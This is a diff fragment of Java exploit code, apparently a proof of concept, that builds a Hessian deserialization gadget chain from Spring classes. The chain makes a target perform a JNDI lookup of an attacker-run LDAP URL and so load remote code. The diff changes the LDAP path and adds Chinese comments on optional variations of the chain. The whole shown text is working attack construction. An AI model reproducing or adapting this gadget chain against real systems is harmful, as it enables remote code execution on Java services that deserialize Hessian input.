@@ -14,22 +14,27 @@ import sun.reflect.ReflectionFactory;
 
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.util.HashMap;
+import java.util.HashSet;
 
 public class PartiallyComparableAdvisorHolderHessian {
     public static void main(String[] args) throws Exception {
         // ldap url
-        String url = "ldap://127.0.0.1:1389/czhupn";
+        String url = "ldap://127.0.0.1:1389/ppkhjx";
 
         // 创建SimpleJndiBeanFactory
         // String SimpleJndiBeanFactory = "org.springframework.jndi.support.SimpleJndiBeanFactory";
         // Object simpleJndiBeanFactory = Class.forName(SimpleJndiBeanFactory).getDeclaredConstructor(new Class[]{}).newInstance();
         SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
-        setFiled(simpleJndiBeanFactory.getJndiTemplate(), "logger", new NoOpLog());
+
+        // 可添加
+        // HashSet<String> set = new HashSet<>();
+        // set.add(url);
+        // setFiled(simpleJndiBeanFactory, "shareableResources", set);
+        // setFiled(simpleJndiBeanFactory.getJndiTemplate(), "logger", new NoOpLog());
 
         // 创建BeanFactoryAspectInstanceFactory
         // 触发SimpleJndiBeanFactory的getType方法
@@ -54,7 +59,7 @@ public class PartiallyComparableAdvisorHolderHessian {
         Object partially = createWithoutConstructor(aClass);
         setFiled(partially, "advisor", aspectJPointcutAdvisor);
 
-
+        // 可以不使用HotSwappableTargetSource
         // 创建HotSwappableTargetSource
         // 触发PartiallyComparableAdvisorHolder的toString方法
         HotSwappableTargetSource targetSource1 = new HotSwappableTargetSource(partially);
